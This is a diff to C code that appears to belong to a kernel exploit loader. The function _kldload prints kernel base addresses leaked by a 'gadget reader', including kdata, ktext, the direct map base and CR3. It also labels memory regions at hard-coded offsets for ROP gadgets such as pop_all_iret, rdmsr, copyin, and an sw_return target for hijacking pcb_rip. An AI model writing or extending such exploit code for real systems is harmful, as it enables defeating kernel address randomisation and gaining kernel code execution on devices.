@@ -431,17 +431,23 @@ static void _kldload(void* data, size_t data_size)
         uint32_t num_regions = (uint32_t)(readback[0] >> 32);
         uint64_t rb_kdata = readback[1];
         uint64_t rb_ktext = readback[2];
+        uint64_t rb_dmap  = readback[3];
+        uint64_t rb_cr3   = readback[4];
 
         printf("\n=== GADGET READER RESULTS ===\n");
         printf("  kdata_base: %#lx\n", rb_kdata);
         printf("  ktext_base: %#lx\n", rb_ktext);
+        printf("  dmap_base:  %#lx\n", rb_dmap);
+        printf("  cr3:        %#lx\n", rb_cr3);
         printf("  regions:    %u\n\n", num_regions);
 
-        /* Each region starts at byte offset 24 (3 uint64s header)
+        /* Each region starts at byte offset 40 (5 uint64s header)
          * Region layout: addr(8) + offset(8) + bytes(256) = 272 bytes */
         uint8_t* raw = (uint8_t*)readback;
-        for (uint32_t r = 0; r < num_regions && r < 8; r++) {
-            uint8_t* rp = raw + 24 + r * 272;
+        /* Cap num_regions to 8 in case field wasn't written */
+        if (num_regions > 8) num_regions = 8;
+        for (uint32_t r = 0; r < num_regions; r++) {
+            uint8_t* rp = raw + 40 + r * 272;
             uint64_t raddr = *(uint64_t*)rp;
             int64_t  roff  = *(int64_t*)(rp + 8);
             uint8_t* rbytes = rp + 16;
@@ -455,6 +461,7 @@ static void _kldload(void* data, size_t data_size)
             else if (roff == -0x9d0cfa)  label = "rdmsr region";
             else if (roff == (-0x9cf8ab - 16)) label = "pop_all_iret region";
             else if (roff == -0x9908e0)  label = "copyin";
+            else if (roff == -0x5A16AB)  label = "sw_return (pcb_rip target)";
 
             printf("  --- Region %u: %s ---\n", r, label);
             printf("  Address: %#lx (kdata_base %+ld / ktext+%#lx)\n",
